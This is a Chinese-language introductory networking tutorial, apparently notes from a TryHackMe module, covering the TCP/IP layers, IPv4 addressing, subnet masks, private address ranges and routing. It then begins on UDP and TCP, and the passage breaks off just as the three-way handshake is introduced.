&lt;p&gt;许多现代网络教科书将 TCP/IP 模型显示为 5 层而不是 4 层。例如，在《计算机网络：自上而下的方法第 8 版》中，&lt;a class=&#34;link&#34; href=&#34;http://gaia.cs.umass.edu/kurose_ross/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Kurose 和 Ross&lt;/a&gt; 通过包括物理层来描述以下五层 Internet 协议堆栈：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application 应用&lt;/li&gt;
&lt;li&gt;Transport 运输&lt;/li&gt;
&lt;li&gt;Network 网络&lt;/li&gt;
&lt;li&gt;Link 链接&lt;/li&gt;
&lt;li&gt;Physical 物理的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ip和子网&#34;&gt;IP和子网
&lt;/h2&gt;&lt;p&gt;当您听到 IP 地址这个词时，您可能会想到 &lt;code&gt;192.168.0.1&lt;/code&gt; 之类的地址或不太常见的地址，例如 &lt;code&gt;172.16.159.243&lt;/code&gt;。在这两种情况下，你都是对的。这两个地址都是 IP 地址;IPv4（IP 版本 4）地址。&lt;/p&gt;
&lt;p&gt;网络上的每台主机都需要一个&lt;strong&gt;唯一标识符&lt;/strong&gt;，以便其他主机与他通信。如果没有唯一标识符，则无法找到没有歧义的主机。使用 TCP/IP 协议套件时，我们需要为连接到网络的每个设备&lt;strong&gt;分配&lt;/strong&gt;一个 IP 地址。&lt;/p&gt;
&lt;p&gt;IP 地址的一个类比是您的&lt;strong&gt;家庭邮政地址&lt;/strong&gt;。您的邮政地址可让您接收来自世界各地的信件和包裹。此外，它可以毫不含糊地识别您的家;否则，您将无法在线购物！&lt;/p&gt;
&lt;p&gt;您可能已经知道，我们有 IPv4 和 IPv6（IP 版本 6）。IPv4 仍然是最常见的，每当你看到提到 IP 的文本而没有版本时，我们预计它们指的是 IPv4。&lt;/p&gt;
&lt;p&gt;那么，什么是 IP 地址？一个 IP 地址由&lt;strong&gt;四个八位字节&lt;/strong&gt;组成，即 32 位。作为 8 位，八位字节允许我们表示 &lt;strong&gt;0 到 255&lt;/strong&gt; 之间的十进制数。IP 地址如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250407233841627.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250407233841627&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IPv4地址规范解析&lt;/strong&gt;
简而言之，IPv4地址段中0与255作为保留地址使用：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络标识地址&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;示例：192.168.1.0 代表C类网络的基准地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;广播通信地址&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;示例：192.168.1.255 作为广播地址，向该地址发送数据将覆盖网络内所有主机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;地址容量计算原理：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理论最大值：基于32位地址空间（2³²）得出约43亿（4,294,967,296）个地址&lt;/li&gt;
&lt;li&gt;实际可用量：需扣除各子网的网络地址与广播地址（如示例中的.0和.255）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查找网络配置&#34;&gt;查找网络配置
&lt;/h3&gt;&lt;p&gt;可以使用命令 &lt;code&gt;ipconfig&lt;/code&gt; 在 MS Windows 命令行上查找您的 IP 地址。在基于 Linux 和 UNIX 的系统上，您可以发出命令 &lt;code&gt;ifconfig&lt;/code&gt; 或 &lt;code&gt;ip address show&lt;/code&gt;，该命令可以键入 &lt;code&gt;ip a s&lt;/code&gt;。在下面的终端窗口中，我们显示 &lt;code&gt;ifconfig&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@TryHackMe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ifconfig&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[...]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;wlo1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;4163&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BROADCAST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RUNNING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MULTICAST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;mtu&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;inet&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;89&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;netmask&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;255.255&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;broadcast&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;255&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;inet6&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fe80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;73e1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ca5e&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;3f93&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b1b3&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;prefixlen&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;64&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;scopeid&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;link&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ether&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cc&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5e&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f8&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;02&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a7&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;txqueuelen&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1000&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Ethernet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;RX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;packets&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;19684680&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;18865072842&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;17.5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GiB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;RX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;errors&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;dropped&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;364&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;overruns&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;frame&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;TX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;packets&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;14439678&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;8773200951&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;8.1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GiB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;TX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;errors&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;dropped&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;overruns&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;carrier&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;collisions&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的 terminal 输出指示以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主机（笔记本电脑）的 IP 地址是 &lt;code&gt;192.168.66.89&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;子网掩码为 &lt;code&gt;255.255.255.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;广播地址为 &lt;code&gt;192.168.66.255&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们使用 &lt;code&gt;ip a s&lt;/code&gt; 来比较网卡 IP 地址的显示方式&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@TryHackMe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[...]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wlo1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BROADCAST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MULTICAST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOWER_UP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mtu&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1500&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;qdisc&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;noqueue&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;state&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;group &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;qlen&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;link&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ether&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cc&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5e&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f8&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;02&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a7&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;brd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;altname&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wlp3s0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;inet&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;89&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;brd&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;255&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scope&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dynamic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;noprefixroute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wlo1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;valid_lft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;36795sec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;preferred_lft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;36795sec&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;inet6&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fe80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;73e1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ca5e&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;3f93&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b1b3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scope&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;noprefixroute&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;valid_lft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;forever&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;preferred_lft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;forever&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的 terminal 输出指示以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主机（笔记本电脑）的 IP 地址是 &lt;code&gt;192.168.66.89/24&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;广播地址为 &lt;code&gt;192.168.66.255&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果您想知道，子网掩码 &lt;code&gt;255.255.255.0&lt;/code&gt; 也可以写为 &lt;code&gt;/24&lt;/code&gt;。&lt;code&gt;/24&lt;/code&gt; 表示 IP 地址中最左边的 24 位在整个网络（即子网）中不会更改。换句话说，最左边的三个八位字节在整个子网中是相同的;因此，我们可以期望找到从 &lt;code&gt;192.168.66.1&lt;/code&gt; 到 &lt;code&gt;192.168.66.254&lt;/code&gt; 的地址。与前面提到的类似，&lt;code&gt;192.168.66.0&lt;/code&gt; 和 &lt;code&gt;192.168.66.255&lt;/code&gt; 分别是网络地址和广播地址。&lt;/p&gt;
&lt;h3 id=&#34;私有地址&#34;&gt;私有地址
&lt;/h3&gt;&lt;p&gt;当我们在解释 IP 地址时，值得一提的是，对于大多数实际目的，有两种类型的 IP 地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;公网 IP 地址&lt;/li&gt;
&lt;li&gt;私有 IP 地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Request for Comments (RFC) 1918 定义了以下三个私有 IP 地址范围：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;10.0.0.0&lt;/code&gt; - &lt;code&gt;10.255.255.255&lt;/code&gt; (&lt;code&gt;10/8&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;172.16.0.0&lt;/code&gt; - &lt;code&gt;172.31.255.255&lt;/code&gt; (&lt;code&gt;172.16/12&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.0.0&lt;/code&gt; - &lt;code&gt;192.168.255.255&lt;/code&gt; (&lt;code&gt;192.168/16&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们之前提供了一个类比，指出公共 IP 地址就像您的&lt;strong&gt;家庭邮政地址&lt;/strong&gt;。私有 IP 地址是不同的;最初的想法是它无法到达或从外部世界到达。它就像一个&lt;strong&gt;孤立的城市或大院&lt;/strong&gt;，所有的房屋和公寓都被系统地编号，可以很容易地相互交换邮件，但不能与外界交换。要使私有 IP 地址访问 Internet，路由器必须具有公有 IP 地址，并且必须支持&lt;strong&gt;网络地址转换 （NAT）&lt;/strong&gt;。在此阶段，我们不必担心了解 NAT 的工作原理，因为我们将在本模块的后面重新讨论它。&lt;/p&gt;
&lt;p&gt;在继续之前，我建议记住&lt;strong&gt;私有 IP 地址范围&lt;/strong&gt;。否则，您可能会看到 &lt;code&gt;10.1.33.7&lt;/code&gt; 或 &lt;code&gt;172.31.33.7&lt;/code&gt; 等 IP 地址，并尝试从公有 IP 地址访问它。&lt;/p&gt;
&lt;h3 id=&#34;路由&#34;&gt;路由
&lt;/h3&gt;&lt;p&gt;路由器就像您当地的&lt;strong&gt;邮局&lt;/strong&gt;;你把邮件包裹交给他们，他们会知道如何投递。如果我们深入挖掘，您可能会将某些内容邮寄到另一个城市或国家的地址。邮局将检查地址并决定下一步寄往何处。例如，如果要离开该国，我们希望一个&lt;strong&gt;中央办公室&lt;/strong&gt;处理所有国外货物。&lt;/p&gt;
&lt;p&gt;用技术术语来说，路由器将数据包转发到适当的网络。通常，数据包在到达最终目的地之前会&lt;strong&gt;经过多个路由器&lt;/strong&gt;。路由器在第 3 层运行，检查 IP 地址并将数据包转发到&lt;strong&gt;最佳网络&lt;/strong&gt;（路由器），以便数据包&lt;strong&gt;更接近&lt;/strong&gt;其目的地。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250407235608659.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250407235608659&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;udp和tcp&#34;&gt;UDP和TCP
&lt;/h2&gt;&lt;p&gt;IP 协议允许我们访问网络上的目标主机;主机由其 IP 地址标识。我们需要使联网主机上的进程能够相互通信的协议。有两种传输协议可以实现此目的：UDP 和 TCP。&lt;/p&gt;
&lt;h3 id=&#34;udp-协议&#34;&gt;UDP 协议
&lt;/h3&gt;&lt;p&gt;UDP（用户数据报协议）允许我们访问此目标主机上的特定进程。UDP 是一种&lt;strong&gt;简单的无连接协议&lt;/strong&gt;，在&lt;strong&gt;传输层&lt;/strong&gt;（即第 4 层）运行。无连接意味着它不需要建立连接。UDP 甚至没有提供一种机制来知道数据包已投递。&lt;/p&gt;
&lt;p&gt;IP 地址标识主机;我们需要一种机制来确定发送和接收过程。这可以通过使用端口号来实现。端口号使用&lt;strong&gt;两个八位字节&lt;/strong&gt;;因此，它的范围介于 1 和 65535 之间;端口 0 被保留。（数字 65535 由表达式 216 − 1 计算得出。）&lt;/p&gt;
&lt;p&gt;一个类似于 UDP 的真实示例是&lt;strong&gt;标准邮件服务&lt;/strong&gt;，没有送达确认。换句话说，不能保证已成功接收 UDP 数据包，类似于使用标准邮件发送包裹而不确认送达的情况。对于标准邮件，这意味着比带确认的邮件递送选项更便宜。对于 UDP，这意味着比提供 “确认” 的传输协议&lt;strong&gt;更快&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;tcp-协议&#34;&gt;TCP 协议
&lt;/h3&gt;&lt;p&gt;TCP（传输控制协议）是一种面向连接的传输协议。它使用各种机制来确保网络主机上不同进程发送的可靠数据交付。与 UDP 一样，它是一个&lt;strong&gt;第 4 层&lt;/strong&gt;协议。由于面向连接，它需要先&lt;strong&gt;建立 TCP 连接&lt;/strong&gt;，然后才能发送任何数据。&lt;/p&gt;
&lt;p&gt;在 TCP 中，每个数据&lt;strong&gt;八位字节&lt;/strong&gt;都有一个序列号;这使得接收方可以轻松识别丢失或重复的数据包。另一方面，接收方使用指定最后接收的八位字节的确认号来确认数据的接收。&lt;/p&gt;
&lt;p&gt;TCP 连接是使用所谓的三次握手建立的。使用了两个标志： &lt;strong&gt;SYN （同步）&lt;/strong&gt; 和 &lt;strong&gt;ACK （确认）&lt;/strong&gt;。数据包的发送方式如下：&lt;/p&gt;
